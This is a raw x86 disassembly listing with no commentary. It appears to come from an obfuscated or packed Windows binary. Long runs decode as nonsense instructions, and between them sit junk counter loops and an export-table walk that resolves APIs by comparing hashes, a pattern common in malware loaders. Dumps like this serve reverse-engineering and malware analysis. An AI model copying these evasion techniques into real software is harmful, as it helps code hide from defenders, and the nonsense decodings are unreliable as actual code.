  41a0c7:	repnz into 
  41a0c9:	hlt    
  41a0ca:	imul   ebx,edi,0x61
  41a0cd:	inc    ebx
  41a0ce:	mov    DWORD PTR [ebx+0x3f33ddcb],ebx
  41a0d4:	sbb    DWORD PTR [eax+eax*8],0xffffffa0
  41a0d8:	in     al,0x87
  41a0da:	jle    0x41a078
  41a0dc:	xlat   BYTE PTR ds:[ebx]
  41a0dd:	dec    edx
  41a0de:	inc    esi
  41a0df:	repnz (bad) 
  41a0e1:	or     al,0x49
  41a0e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0e5:	jno    0x41a0bd
  41a0e7:	dec    ecx
  41a0e8:	pusha  
  41a0e9:	xor    ebp,ebp
  41a0eb:	dec    edi
  41a0ec:	inc    eax
  41a0ed:	mov    esp,0x4429029
  41a0f2:	out    0xf9,al
  41a0f4:	test   al,0x56
  41a0f6:	inc    eax
  41a0f7:	cmp    bl,BYTE PTR cs:[edi+0x8b5281f]
  41a0fe:	out    dx,eax
  41a0ff:	adc    bh,BYTE PTR [ebx]
  41a101:	or     BYTE PTR [esi],cl
  41a103:	inc    ebx
  41a104:	aam    0xd
  41a106:	push   ecx
  41a107:	inc    esi
  41a108:	call   0x10bd:0xc01cf203
  41a10f:	cmp    cl,BYTE PTR [ebx+0x2b]
  41a112:	or     edx,DWORD PTR [eax+0x77]
  41a115:	sar    BYTE PTR [esi+0x793f41ec],cl
  41a11b:	cdq    
  41a11c:	call   0x5922:0xe0f760b0
  41a123:	out    dx,al
  41a124:	xor    dl,BYTE PTR [ecx+0x3e]
  41a127:	scas   eax,DWORD PTR es:[edi]
  41a128:	add    BYTE PTR [edi],cl
  41a12a:	mov    edx,0x904b3c17
  41a12f:	hlt    
  41a130:	je     0x41a0f3
  41a132:	cmp    al,0xdf
  41a134:	retf   0x4109
  41a137:	push   esp
  41a138:	sahf   
  41a139:	cmp    BYTE PTR [ebx-0x262583b2],al
  41a13f:	packssdw mm3,QWORD PTR [eax]
  41a142:	call   0x6a21:0xa49b328
  41a149:	icebp  
  41a14a:	push   es
  41a14b:	mov    al,gs:0x95293c36
  41a151:	mov    ch,0x7b
  41a153:	and    DWORD PTR [eax+0x75],ebx
  41a156:	aas    
  41a157:	sub    al,0xa7
  41a159:	sti    
  41a15a:	jae    0x41a14d
  41a15c:	neg    BYTE PTR [esi*8+0x8c16743]
  41a163:	sub    edi,DWORD PTR [ebx-0x29]
  41a166:	ret    0xd924
  41a169:	adc    edi,edi
  41a16b:	xlat   BYTE PTR ds:[ebx]
  41a16c:	and    ah,bl
  41a16e:	lea    esi,[edx-0x55]
  41a171:	lock dec ebp
  41a173:	out    dx,eax
  41a174:	dec    esi
  41a175:	jge    0x41a172
  41a177:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a179:	and    DWORD PTR [esi],ebx
  41a17b:	jbe    0x41a11f
  41a17d:	pop    ebx
  41a17e:	sub    ebx,DWORD PTR [edi+0x5c]
  41a181:	fcmovb st,st(0)
  41a183:	mov    ds:0x92038d50,eax
  41a188:	and    ebp,DWORD PTR [edi-0x513efe81]
  41a18e:	cmp    dh,bh
  41a190:	aaa    
  41a191:	nop
  41a192:	or     BYTE PTR [edx-0x655c00d1],al
  41a198:	call   0x6a8c9e82
  41a19d:	adc    ah,ah
  41a19f:	sbb    cl,BYTE PTR [ebx-0x24ebcfdc]
  41a1a5:	les    edi,FWORD PTR [esi-0x270af04e]
  41a1ab:	xor    ah,dl
  41a1ad:	push   eax
  41a1ae:	outs   dx,DWORD PTR ds:[esi]
  41a1af:	stos   BYTE PTR es:[edi],al
  41a1b0:	adc    eax,esp
  41a1b2:	adc    DWORD PTR [esi+0x8],eax
  41a1b5:	shl    DWORD PTR [esp+ecx*4-0x4122a19],cl
  41a1bc:	jmp    0x41a1e3
  41a1be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1bf:	adc    BYTE PTR [esi],ch
  41a1c1:	and    BYTE PTR [eax+0x53],ah
  41a1c4:	out    0xae,al
  41a1c6:	lock nop
  41a1c8:	retf   0xd29
  41a1cb:	dec    esp
  41a1cc:	cmp    eax,0x992e0f90
  41a1d1:	sbb    bl,BYTE PTR [ebx+0x6edb2774]
  41a1d7:	lods   eax,DWORD PTR ds:[esi]
  41a1d8:	popa   
  41a1d9:	scas   al,BYTE PTR es:[edi]
  41a1da:	retf   
  41a1db:	inc    edx
  41a1dd:	and    eax,0xaed1e225
  41a1e2:	xchg   DWORD PTR [ebp+0x59],edi
  41a1e5:	lods   al,BYTE PTR ds:[esi]
  41a1e6:	popf   
  41a1e7:	out    0xb4,al
  41a1e9:	mov    al,ds:0x58e8c5de
  41a1ee:	mov    ds:0x1d418df1,al
  41a1f3:	inc    edx
  41a1f4:	test   BYTE PTR [esi],dh
  41a1f6:	mov    eax,0x3600f9
  41a1fb:	cmp    dl,ah
  41a1fd:	mov    ebp,0x458bbee1
  41a202:	cld    
  41a203:	mov    ecx,DWORD PTR [ebp-0x20]
  41a206:	mov    DWORD PTR ds:0x42af31,0x1c
  41a210:	cmp    DWORD PTR ds:0x42af31,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42af31,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42af31
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42af31,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42afcd,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42aeed,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42aed9,0x42afcd
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a2a2
  41a293:	es and eax,0x7fd19819
  41a299:	js     0x41a2ab
  41a29b:	jle    0x41a315
  41a29d:	js     0x41a25b
  41a29f:	and    al,0x0
  41a2a1:	mov    ah,0x1c
  41a2a3:	ins    BYTE PTR es:[edi],dx
  41a2a4:	dec    edi
  41a2a5:	lods   al,BYTE PTR ds:[esi]
  41a2a6:	jne    0x41a273
  41a2a8:	pop    esi
  41a2a9:	jo     0x41a282
  41a2ab:	dec    edi
  41a2ac:	repnz ss mov edi,0xd6883cfe
  41a2b3:	test   eax,0xebe0f349
  41a2b8:	xchg   edi,eax
  41a2b9:	xor    eax,edx
  41a2bb:	xor    al,0x87
  41a2bd:	xchg   edi,eax
  41a2be:	data16 std 
  41a2c0:	pop    ecx
  41a2c1:	push   es
  41a2c2:	fimul  DWORD PTR [eax]
  41a2c4:	iret   
  41a2c5:	add    ecx,DWORD PTR [esi-0x37ad012]
  41a2cb:	int    0x18
  41a2cd:	adc    DWORD PTR [esi+0x49],edi
  41a2d0:	cmc    
  41a2d1:	cmp    cl,BYTE PTR [ebp-0x3d]
  41a2d4:	mov    edx,0x49813d95
  41a2d9:	shr    bl,0x3b
  41a2dc:	pop    edx
  41a2dd:	jecxz  0x41a283
  41a2df:	dec    esp
  41a2e0:	pop    ebx
  41a2e1:	int    0x2c
  41a2e3:	push   ss
  41a2e4:	ja     0x41a322
  41a2e6:	push   ebx
  41a2e7:	dec    ebp
  41a2e8:	fistp  DWORD PTR [esi-0x5e]
  41a2eb:	mov    eax,ds:0xd696fc4b
  41a2f0:	ror    BYTE PTR [ecx+0x1f],1
  41a2f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2f4:	adc    al,0xb0
  41a2f6:	jp     0x41a366
  41a2f8:	and    al,0x11
  41a2fa:	xchg   edx,eax
  41a2fb:	jecxz  0x41a2e5
  41a2fd:	jg     0x41a336
  41a2ff:	loopne 0x41a36d
  41a301:	xlat   BYTE PTR ds:[ebx]
  41a302:	ret    
  41a303:	xchg   BYTE PTR [ebx],cl
  41a305:	jo     0x41a355
  41a307:	fcom   st(4)
  41a309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a30a:	inc    esi
  41a30b:	cmp    DWORD PTR [ecx],ebx
  41a30d:	in     eax,0x71
  41a30f:	jle    0x41a297
  41a311:	rcl    BYTE PTR [ecx],1
  41a313:	ret    
  41a314:	out    dx,eax
  41a315:	mov    edx,0x40a823c
  41a31a:	arpl   WORD PTR [ecx],ax
  41a31c:	sbb    BYTE PTR [ebx],al
  41a31e:	cs iret 
  41a320:	pop    eax
  41a321:	(bad)  
  41a322:	hlt    
  41a323:	mov    esi,0xfd0d0425
  41a328:	jns    0x41a320
  41a32a:	pop    esp
  41a32b:	fldcw  WORD PTR [ecx-0xc67331c]
  41a331:	sub    dh,cl
  41a333:	xor    cl,0x6
  41a336:	faddp  st(0),st
  41a338:	mov    esi,ebp
  41a33a:	pop    ds
  41a33b:	out    0x4d,al
  41a33d:	xchg   esi,eax
  41a33e:	or     DWORD PTR [edi+0x3522589b],ebx
  41a344:	daa    
  41a345:	mov    eax,0x268099b0
  41a34a:	jo     0x41a39d
  41a34c:	mov    ds:0xb72f165e,al
  41a351:	adc    ebx,DWORD PTR [ebx+0x4a]
  41a354:	mov    bl,BYTE PTR [edx-0x2ae205ca]
  41a35a:	addr16 mov edi,0x9d6f4a0b
  41a360:	dec    ebp
  41a361:	pop    ss
  41a362:	jl     0x41a364
  41a364:	fisub  DWORD PTR [ecx-0x42]
  41a367:	xchg   edi,eax
  41a368:	xor    DWORD PTR [ebx],esp
  41a36a:	popf   
  41a36b:	out    0x2c,eax
  41a36d:	pushf  
  41a36e:	push   0xd9c35545
  41a373:	aad    0x4b
  41a375:	aam    0x5
  41a377:	xchg   ecx,eax
  41a378:	adc    al,0xfe
  41a37a:	adc    esi,DWORD PTR [esi]
  41a37c:	inc    eax
  41a37d:	pop    edi
  41a37e:	sbb    al,0x97
  41a380:	in     al,dx
  41a381:	dec    esi
  41a382:	pushf  
  41a383:	iret   
  41a384:	mov    ecx,?
  41a386:	fdivr  QWORD PTR [edx+0xfd3657a]
  41a38c:	jmp    0x2076:0x52bd2939
  41a393:	or     DWORD PTR [esp+edx*2+0x3f],edi
  41a397:	out    dx,eax
  41a398:	sub    edx,0xfffffff0
  41a39b:	mov    esi,0x234415fe
  41a3a0:	outs   dx,DWORD PTR ds:[esi]
  41a3a1:	in     eax,0x40
  41a3a3:	mov    edx,0xef6eeec8
  41a3a9:	in     al,dx
  41a3aa:	(bad)  
  41a3ab:	sahf   
  41a3ac:	leave  
  41a3ad:	cmp    eax,0xa6cdf197
  41a3b2:	ret    0x1a59
  41a3b5:	jmp    0x41a42e
  41a3b7:	ins    BYTE PTR es:[edi],dx
  41a3b8:	or     al,0xa0
  41a3ba:	and    BYTE PTR [eax],dl
  41a3bc:	fld    DWORD PTR [eax+0x5dd37908]
  41a3c2:	inc    esi
  41a3c3:	jecxz  0x41a373
  41a3c5:	and    BYTE PTR [ebx-0x2f03cb01],bl
  41a3cb:	fcomp  DWORD PTR [edx]
  41a3cd:	sub    bl,cl
  41a3cf:	rcr    ebx,0xb6
  41a3d2:	mov    bl,0x44
  41a3d4:	fnstcw WORD PTR [ebp+0x52bda033]
  41a3da:	mov    ch,0x47
  41a3dc:	and    al,0x91
  41a3de:	cmp    al,0xf3
  41a3e0:	sub    eax,0x1f3f4d17
  41a3e5:	std    
  41a3e6:	jno    0x41a3b1
  41a3e8:	pop    ebx
  41a3e9:	and    ch,BYTE PTR [esi+esi*4+0xa]
  41a3ed:	cwde   
  41a3ee:	mov    ds:0xfafd3599,eax
  41a3f3:	repnz test DWORD PTR [esp],eax
  41a3f7:	add    edx,ecx
  41a3f9:	imul   DWORD PTR [esi]
  41a3fb:	(bad)  
  41a3fc:	jns    0x41a3fb
  41a3fe:	cwde   
  41a3ff:	lea    edx,[edx]
  41a401:	jnp    0x41a3ac
  41a403:	mov    WORD PTR [eax+0x4b501dc0],fs
  41a409:	and    eax,0xb6ede40e
  41a40e:	pop    edi
  41a40f:	(bad)  
  41a410:	sub    eax,0x3b188af9
  41a415:	cmp    BYTE PTR [eax],al
  41a417:	dec    esi
  41a418:	daa    
  41a419:	inc    esp
  41a41a:	xchg   edi,eax
  41a41b:	jae    0x41a3b8
  41a41d:	sbb    ah,0xfb
  41a420:	inc    edi
  41a421:	mov    al,ds:0xa26cb5f6
  41a426:	or     BYTE PTR [ecx+0x4388b22a],ch
  41a42c:	xor    DWORD PTR [edx-0x8],ebx
  41a42f:	mov    ah,BYTE PTR [eax+ebx*8]
  41a432:	in     eax,dx
  41a433:	sub    dh,BYTE PTR [edx]
  41a435:	mov    ds:0xcccfecff,eax
  41a43a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a43c:	bound  edx,QWORD PTR [esi+0xa]
  41a43f:	xor    al,al
  41a441:	add    dh,bh
  41a443:	sub    esi,DWORD PTR [esi+0x2f309b52]
  41a449:	test   ah,bl
  41a44b:	(bad)  
  41a44c:	jge    0x41a44d
  41a44e:	cmp    dh,BYTE PTR [ebp-0x7c]
  41a451:	mov    ds,WORD PTR [ecx-0x3c96c49]
  41a457:	cs jg  0x41a416
  41a45a:	ja     0x41a40f
  41a45c:	mov    ebp,0x63aead5c
  41a461:	bound  edx,QWORD PTR [eax-0x7ba04b2a]
  41a467:	xchg   edx,eax
  41a468:	(bad)  
  41a469:	icebp  
  41a46a:	or     DWORD PTR [ebp-0x12],eax
  41a46d:	xlat   BYTE PTR ds:[ebx]
  41a46e:	cdq    
  41a46f:	sub    al,0x8d
  41a471:	mov    ecx,DWORD PTR [ebp+0x2d]
  41a474:	inc    edi
  41a475:	(bad)  
  41a476:	xlat   BYTE PTR ds:[ebx]
  41a477:	(bad)  
  41a478:	enter  0xc923,0x78
  41a47c:	inc    ebx
  41a47d:	inc    ecx
  41a47e:	pop    ebx
  41a47f:	or     esp,ebp
  41a481:	in     eax,0x64
  41a483:	hlt    
  41a484:	fcmovnu st,st(0)
  41a486:	xlat   BYTE PTR ds:[ebx]
  41a487:	jge    0x41a434
  41a489:	or     DWORD PTR [eax-0x3],edi
  41a48c:	and    eax,DWORD PTR [eax+0x5f]
  41a48f:	or     eax,0xa6505047
  41a494:	mov    dh,0xf3
  41a496:	jne    0x41a438
  41a498:	mov    al,0x9
  41a49a:	adc    DWORD PTR [ebp+0x74f580d6],esi
  41a4a0:	ja     0x41a4c2
  41a4a2:	cwde   
  41a4a3:	add    edx,DWORD PTR [eax+0x67]
  41a4a6:	fs (bad) 
  41a4a8:	adc    dh,ch
  41a4aa:	push   eax
  41a4ab:	xor    ah,BYTE PTR [ecx+0x2c]
  41a4ae:	out    dx,eax
  41a4af:	pop    es
  41a4b0:	and    eax,0xe4bafd32
  41a4b5:	jmp    0xc82dea43
  41a4ba:	add    eax,0x42aedd
  41a4bf:	sbb    BYTE PTR [eax],al
  41a4c1:	add    BYTE PTR [eax],al
  41a4c3:	cmp    DWORD PTR ds:0x42aedd,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42aedd,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42aedd
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42aedd,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42af71,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42af71
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42af71,eax
  41a512:	cmp    DWORD PTR ds:0x42af71,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42af71,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42af71,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42af71
  41a551:	inc    eax
  41a552:	mov    ds:0x42af71,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42aefd,0x11
  41a566:	cmp    DWORD PTR ds:0x42aefd,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42aefd,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42aefd
  41a590:	dec    eax
  41a591:	mov    ds:0x42aefd,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42aed9,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42aed9
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42aed9,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42aed9,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42aed9,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42aed9
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42aed9,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42aed9,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	xchg   ecx,eax
  41a68f:	push   es
  41a690:	dec    esi
  41a691:	std    
  41a692:	mov    al,0xd7
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a6f1
  41a69b:	cs pop ebx
  41a69d:	lods   al,BYTE PTR ds:[esi]
  41a69e:	in     al,dx
  41a69f:	lock icebp 
  41a6a1:	mov    dh,0x3e
  41a6a3:	repz jnp 0x41a6f8
  41a6a6:	test   BYTE PTR [edx+0x70067bf0],ah
  41a6ac:	rcr    BYTE PTR [edi-0x6],cl
  41a6af:	es push esi
  41a6b1:	sub    BYTE PTR [ebp-0x7550a401],dh
  41a6b7:	and    ebx,DWORD PTR [eax+0x4a]
  41a6ba:	int    0xfb
  41a6bc:	xchg   ebp,eax
  41a6bd:	lods   eax,DWORD PTR ds:[esi]
  41a6be:	inc    edx
  41a6bf:	push   DWORD PTR [edi+ebp*8+0x563907ba]
  41a6c6:	and    bh,BYTE PTR [edx-0x8]
  41a6c9:	fiadd  WORD PTR [edi+0x2e]
  41a6cc:	not    DWORD PTR [ecx+0x5b1be1c5]
  41a6d2:	dec    ebx
  41a6d3:	mov    ebx,fs
  41a6d5:	aad    0x49
  41a6d7:	push   esi
  41a6d8:	mov    ch,0xd
  41a6da:	xor    al,BYTE PTR [ebx+0x4c0e105c]
  41a6e0:	(bad)  
  41a6e1:	mov    al,ds:0x7f4536f
  41a6e6:	jb     0x41a6a9
  41a6e8:	sub    DWORD PTR [esi-0x3dd7a071],edi
  41a6ee:	fistp  QWORD PTR [esi+ebp*1]
  41a6f1:	dec    esi
  41a6f2:	aad    0x85
  41a6f4:	and    al,BYTE PTR [ebp-0x40]
  41a6f7:	pop    eax
  41a6f8:	retf   
  41a6f9:	xchg   ebx,eax
  41a6fa:	sbb    BYTE PTR [edx],ah
  41a6fc:	inc    edi
  41a6fd:	xor    DWORD PTR [ecx-0x55],ebx
  41a700:	ds jg  0x41a75a
  41a703:	daa    
  41a704:	or     dl,BYTE PTR [eax]
  41a706:	and    BYTE PTR [edi+0x7e291d39],dl
  41a70c:	xor    DWORD PTR [edx],0x2d8ddda9
  41a712:	pop    edi
  41a713:	or     cl,cl
  41a715:	(bad)  
  41a716:	fucomip st,st(2)
  41a718:	add    ah,BYTE PTR ds:0xfaef4cbf
  41a71e:	sti    
  41a71f:	stos   DWORD PTR es:[edi],eax
  41a720:	sub    BYTE PTR [ebx],bl
  41a722:	sub    BYTE PTR [ecx+0x7c12de1c],bl
  41a728:	push   ecx
  41a729:	xchg   esi,eax
  41a72a:	(bad)  
  41a72b:	ss fsub st(1),st
  41a72e:	lock jg 0x41a73d
  41a731:	into   
  41a732:	jns    0x41a743
  41a734:	(bad)  
  41a735:	dec    ebx
  41a736:	xchg   ecx,eax
  41a737:	push   ds
  41a738:	imul   esi,DWORD PTR [edx+0x4a],0xdac4b53c
  41a73f:	std    
  41a740:	int3   
  41a741:	xor    BYTE PTR ds:0x2733214d,ah
  41a747:	xchg   ebx,eax
  41a748:	test   eax,0x14ff38a0
  41a74d:	pop    edx
  41a74e:	xor    edi,DWORD PTR [ecx+0x5a]
  41a751:	gs fs or eax,0xecd1236d
  41a758:	jl     0x41a6fc
  41a75a:	push   ds
  41a75b:	test   eax,0x5def4041
  41a760:	mov    dl,0x97
  41a762:	mov    ch,0xdb
  41a764:	sub    BYTE PTR [ebx-0x6c],cl
  41a767:	mov    cl,0xa4
  41a769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a76a:	and    esi,eax
  41a76c:	push   0xc0157e18
  41a771:	in     al,0xee
  41a773:	(bad)  
  41a774:	ins    BYTE PTR es:[edi],dx
  41a775:	xor    dh,BYTE PTR [eax+0x70]
  41a778:	and    al,0xcc
  41a77a:	loope  0x41a7c4
  41a77c:	add    dl,al
  41a77e:	retf   0xad80
  41a781:	sbb    eax,0x9b279158
  41a786:	fsubp  st(1),st
  41a788:	in     al,dx
  41a789:	and    dl,BYTE PTR [ecx]
  41a78b:	je     0x41a748
  41a78d:	fmul   QWORD PTR [eax]
  41a78f:	stc    
  41a790:	sbb    BYTE PTR [ebp-0x1c],bl
  41a793:	jmp    0x41a754
  41a795:	das    
  41a796:	sar    ecx,1
  41a798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a799:	sub    DWORD PTR [ecx+0x4a],eax
  41a79c:	add    dl,BYTE PTR [esi+0x3b]
  41a79f:	inc    ecx
  41a7a0:	nop
  41a7a1:	out    0x55,eax
  41a7a3:	lea    eax,[edx]
  41a7a5:	or     al,0x1d
  41a7a7:	not    DWORD PTR [esp+edi*2+0x46]
  41a7ab:	cmp    DWORD PTR [ebx],0xffffff90
  41a7ae:	imul   ebx,DWORD PTR [eax],0x24a5c555
  41a7b4:	push   esi
  41a7b5:	jge    0x41a761
  41a7b7:	aas    
  41a7b8:	out    0xe2,eax
  41a7ba:	ret    0x2d38
  41a7bd:	sar    DWORD PTR [ebp-0x42778a84],1
  41a7c3:	(bad)  
  41a7c4:	aad    0x92
  41a7c6:	inc    edi
  41a7c7:	cmp    eax,0x97ad94cb
  41a7cc:	inc    esp
  41a7cd:	pop    esi
  41a7ce:	loope  0x41a836
  41a7d0:	(bad)  
  41a7d1:	hlt    
  41a7d2:	inc    edi
  41a7d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7d4:	add    DWORD PTR [edi],0x8deb5d78
  41a7da:	jns    0x41a780
  41a7dc:	mov    bl,0x0
  41a7de:	call   0xe80659a7
  41a7e3:	ret    0xff68
  41a7e6:	loopne 0x41a81b
  41a7e8:	and    DWORD PTR [esp+ebp*8-0x7af5c3aa],edi
  41a7ef:	in     eax,dx
  41a7f0:	sub    BYTE PTR [edx+0xc08c389],dl
  41a7f6:	xor    al,0x64
  41a7f8:	cmp    BYTE PTR [ebx-0x71e730ad],0xd6
  41a7ff:	jno    0x41a807
  41a801:	jge    0x41a7fc
  41a803:	(bad)  
  41a804:	sbb    eax,0xb2e2a102
  41a809:	sbb    al,0x19
  41a80b:	in     al,0x5f
  41a80d:	dec    esi
  41a80e:	(bad)  
  41a80f:	in     al,dx
  41a810:	int    0x7c
  41a812:	int3   
  41a813:	ret    0xdb7b
  41a816:	(bad)  
  41a817:	and    DWORD PTR es:[esi+edx*8+0x23],0xed38b341
  41a820:	or     eax,0x3e7b8c53
  41a825:	dec    ecx
  41a826:	adc    eax,0x1b6d006b
  41a82b:	xchg   edi,eax
  41a82c:	cmp    ch,BYTE PTR [edi-0x549dc4c9]
  41a832:	clc    
  41a833:	pop    eax
  41a834:	xchg   edx,eax
  41a835:	adc    BYTE PTR [ecx+0x3d],bl
  41a838:	rol    edx,0xad
  41a83b:	outs   dx,BYTE PTR ds:[esi]
  41a83c:	mov    ebp,0x15629e97
  41a841:	and    DWORD PTR [edi],esi
  41a843:	(bad)  [eax]
  41a845:	xor    dh,cl
  41a847:	sahf   
  41a848:	test   al,0x34
  41a84a:	push   ss
  41a84b:	mov    bh,0x52
  41a84d:	xchg   esp,eax
  41a84e:	mov    ds:0x75196d87,eax
  41a853:	cli    
  41a854:	cmp    BYTE PTR [ebx],0x89
  41a857:	jle    0x41a7f2
  41a859:	xor    DWORD PTR [ebx-0x3e],ebx
  41a85c:	(bad)  
  41a85d:	add    BYTE PTR [ebx+ecx*2-0x5a],al
  41a861:	xchg   esp,eax
  41a862:	jb     0x41a828
  41a864:	repnz or al,0x16
  41a867:	dec    edi
  41a868:	xchg   ebp,eax
  41a869:	push   esp
  41a86a:	or     eax,0x3e7a44a7
  41a86f:	iret   
  41a870:	fnstcw WORD PTR [eax-0x72be139e]
  41a876:	bound  ebp,QWORD PTR [ecx]
  41a878:	aas    
  41a879:	(bad)  
  41a87a:	in     al,dx
  41a87b:	xchg   esi,eax
  41a87c:	shr    DWORD PTR [esi],1
  41a87e:	mov    edi,ebx
  41a880:	dec    edx
  41a881:	jp     0x41a89e
  41a883:	cmp    al,0xdd
  41a885:	pop    es
  41a886:	sbb    DWORD PTR [edx-0x32989fa9],esi
  41a88c:	inc    edi
  41a88d:	repz jl 0x41a833
  41a890:	xlat   BYTE PTR ds:[ebx]
  41a891:	call   0xeef3:0x78d872b5
  41a898:	aad    0x44
  41a89a:	cmp    al,0x16
  41a89c:	sbb    al,0x4a
  41a89e:	add    ecx,esi
  41a8a0:	sbb    DWORD PTR [edx-0x49],ebx
  41a8a3:	es mov ecx,0xff0391f4
  41a8a9:	xor    esp,DWORD PTR [esp+ecx*8+0x45]
  41a8ad:	imul   edi,ebp,0x31146fa
  41a8b3:	ret    
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
